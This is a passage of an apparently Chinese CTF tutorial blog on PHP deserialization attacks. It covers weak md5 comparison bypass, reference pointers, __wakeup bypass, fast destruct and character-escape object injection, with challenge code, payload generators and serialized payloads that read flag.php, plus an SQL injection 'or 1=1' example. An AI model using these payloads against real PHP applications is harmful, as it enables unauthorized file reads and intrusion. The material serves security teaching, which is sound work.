<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>传入时存在一个弱类型的比较 用数组即可绕过</p>
<p>在BUU类中存在一个uniqid()函数 以微秒级生成标识 每时每刻都在改变，所以我们没办法确定input的值传入 而是通过指针的方法调用correct的值进行绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">//    public function __destruct() &#123;</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//            $this-&gt;correct = base64_encode(uniqid());</span><br><span class="hljs-comment">//            if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="hljs-comment">//                echo file_get_contents(&quot;/flag&quot;);</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125; catch (Exception $e) &#123;</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//    &#125;</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU;<br><span class="hljs-variable">$a</span> -&gt; input = &amp;<span class="hljs-variable">$a</span> -&gt; correct;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BUU&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;correct&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;input&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/.com//17476565097171150640440786115888-20250519200830-rrjxtqt.png" srcset="/image/loading.gif" lazyload alt="17476565097171150640440786115888"></p>
<h2 id="例题2：2020蓝帽杯"><a href="#例题2：2020蓝帽杯" class="headerlink" title="例题2：2020蓝帽杯"></a>例题2：2020蓝帽杯</h2><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Seri</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$alize</span>;<br>    <span class="hljs-comment">// public function __construct($alize) &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;alize = $alize;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;alize-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Another construction!!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;f = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;t1 = <span class="hljs-variable language_">$this</span>-&gt;t2 = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;t2 = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t2;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;t1 === <span class="hljs-variable language_">$this</span>-&gt;t2)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f))&#123;<br>                <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;f,<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;niubi&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$p</span>)) &#123;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// echo &quot;NONONO&quot;;</span><br>&#125;<br><br><span class="hljs-comment">// $a = new Seri;</span><br><span class="hljs-comment">// $b = new Flag;  注意使用该语句生成payload的时候要把本地的方法禁用</span><br><span class="hljs-comment">// $a -&gt; alize = $b;</span><br><span class="hljs-comment">// $b -&gt; t1 = &amp;$b -&gt; t2; </span><br><span class="hljs-comment">// $b -&gt; f = &#x27;flag.php&#x27;;</span><br><span class="hljs-comment">// echo serialize($a);</span><br></code></pre></td></tr></table></figure>

<p><img src="/.com//17476565317604900775680869431296-20250519200852-08dr7rx.png" srcset="/image/loading.gif" lazyload alt="17476565317604900775680869431296"></p>
<p>但是本道题因为是rand函数 随机生成的范围有限</p>
<p>所以可以随意设置一个范围内的数字 然后通过bp进行爆破</p>
<hr>
<h1 id="畸形序列化字符串"><a href="#畸形序列化字符串" class="headerlink" title="畸形序列化字符串"></a>畸形序列化字符串</h1><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol>
<li>绕过__wakeup（）</li>
<li>fast destruct快速析构</li>
</ol>
<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h5><p>在老版本的php中对序列化的结果的对象属性值+n</p>
<h5 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h5><p>类需要利用析构方法进行某种操作（帮助你去拿flag），但是在析构之前会调用一些方法进行过滤或干扰，常见的出题形式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><span class="hljs-variable">$obj</span> -&gt; <span class="hljs-title function_ invoke__">safe_filter</span>();    <span class="hljs-comment">//调用一个进行安全检查的方法</span><br></code></pre></td></tr></table></figure>

<p><strong>快速析构的原理：</strong></p>
<p>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；</p>
<p>但是由于给的是一个畸形的反序列化字符串，是不标准的，php对这个畸形序列化字符串得到的<strong>对象</strong>不放心，会赶紧把该<strong>对象</strong>清除掉，就会触发其析构方法。</p>
<p>这样就会提前触发析构方法，不需要等到所用语句都执行结束，也就可以避免一些安全检查方法的调用。</p>
<hr>
<h1 id="0708反序列化字符逃逸"><a href="#0708反序列化字符逃逸" class="headerlink" title="0708反序列化字符逃逸"></a>0708反序列化字符逃逸</h1><h3 id="开篇例题："><a href="#开篇例题：" class="headerlink" title="开篇例题："></a>开篇例题：</h3><h4 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h4><p><a target="_blank" rel="noopener" href="http://122.114.252.87:2030/">http://122.114.252.87:2030/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><span class="hljs-comment">//函数作用：把0*0 替换为\0\0\0  因为后面这个内容是在单引号里面包裹 所以斜杠就是斜杠  但是如果在双引号里面包裹就会变成转义字符</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-comment">//关键所在这里的替换字符数不等长  3到6字符的替换</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-comment">//6到3字符的替换</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;world&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">//flag.php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;c);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//关于read和write函数 如果可以保证外层替换的字符串存在  内层的不存在  就可以只触发外层函数</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)))); <br></code></pre></td></tr></table></figure>

<p>对于双引号和单引号的测试如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php -a   <span class="hljs-comment">//直接在cmd中输入 会启动php</span><br><br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;\n&#x27;</span>;<br>\n               <span class="hljs-comment">//单引号是什么就输出什么</span><br>php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>                <span class="hljs-comment">//转义后只有换行</span><br>php &gt;<br></code></pre></td></tr></table></figure>

<p>类比sql注入中的逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">select * <span class="hljs-keyword">from</span> users where u=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">//进行逃逸</span><br>select * <span class="hljs-keyword">from</span> users where u=<span class="hljs-string">&#x27;\&#x27; and p=&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //单引号会被转义掉</span><br><span class="hljs-string">=&gt; select * from users where u=&#x27;</span> <span class="hljs-keyword">and</span> p=<span class="hljs-string">&#x27; or 1=1&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="本质："><a href="#本质：" class="headerlink" title="本质："></a>本质：</h4><p>对序列化字符串进行不等长的字符串替换，导致本来属于普通字符串的一部分字符串变成了序列化的一部分，或者导致本来不属于字符串的一部分变成了字符串的一部分，进而造成了序列化数据的错乱，导致了对象注入。</p>
<h4 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h4><p>获取A的序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;PW&quot;</span>;<br>    <br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;PW&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>获取BC的序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;world&#x27;</span>;<br>    <span class="hljs-comment">// function __destruct()&#123;</span><br>    <span class="hljs-comment">//      字符串的拼接触发toString </span><br>    <span class="hljs-comment">//      $c = &#x27;hello&#x27;.$this-&gt;b;</span><br>    <span class="hljs-comment">//     //echo类的对象会触发toString方法</span><br>    <span class="hljs-comment">//     echo $c;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-comment">// function __toString()&#123;</span><br>    <span class="hljs-comment">//     //flag.php</span><br>    <span class="hljs-comment">//     echo file_get_contents($this-&gt;c);</span><br>    <span class="hljs-comment">//     return &#x27;nice&#x27;;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$b</span> -&gt; b = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>)<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>接下来需要把BC读取flag的序列化结果填入到A中</p>
<p>首先对于序列化的属性进行讲解：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;张三&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;李四&quot;</span>;i:<span class="hljs-number">2</span>;i:<span class="hljs-number">18</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>简单说明下序列化字符串</p>
<p>a:3 ——&gt; 代表集合中有3个元素，a则是array类型（o则是object，s则是string，i则是integer等等）</p>
<p>i:0;s:6:”张三” ——&gt; i:0则是第一个元素，s:6则是string，字符串长度为6，元素是张三</p>
<p>i:2;i:18 ——&gt; i:2则是第三个元素，i:18则是int，整数不计算长度，元素是18</p>
<blockquote>
<p>a – array<br>b – boolean<br>d – double<br>i – integer<br>o – common object<br>r – reference<br>s – string<br>C – custom object<br>O – class<br>N – null<br>R – pointer reference<br>U – unicode string<br>N 表示的是 NULL</p>
</blockquote>
<p>所以把我们生成的两个序列化放到一起研究如何利用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;PW&quot;</span>;&#125;<br><span class="hljs-keyword">object</span> 一个 为A类 中有两个成员 <br>    第一个是<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">8</span> 名为username 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">2</span> 值为UN <br>    第二个是<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">8</span> 名为password 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">2</span> 值为PW<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;<br><span class="hljs-keyword">object</span> 一个 为B类 中有一个成员<br>    第一个为<span class="hljs-keyword">string</span>型 长度为<span class="hljs-number">1</span> 名为b <br>    其值为<span class="hljs-keyword">object</span>型 一个 值为C 其中包含一个成员 <span class="hljs-keyword">string</span>型 名为c 其值为<span class="hljs-keyword">string</span>型长度为<span class="hljs-number">8</span> 值为flag.php<br></code></pre></td></tr></table></figure>

<p>拼接：BC 填入到 A中 因为函数执行的是A的对象 把PW给删了 分号结尾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;属性s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;属性的值s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;UN&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot; 补一个分号结尾;这些全部吃掉 把password约束吃掉的结果 作为username的值  这里缺少属性 补一个 属性s:8:&quot;</span>password<span class="hljs-string">&quot;;属性的值（object型）O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125; 这里的两个符号&quot;</span>;也多余了 补充保证格式正确s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">0</span><span class="hljs-string">&quot;&quot;</span>; &#125;<br></code></pre></td></tr></table></figure>

<p>添加到PW的位置后我们发现 一个双引号后面直接来了个O有些突兀</p>
<p>直接放到函数中进行生成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;<br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>即为</p>
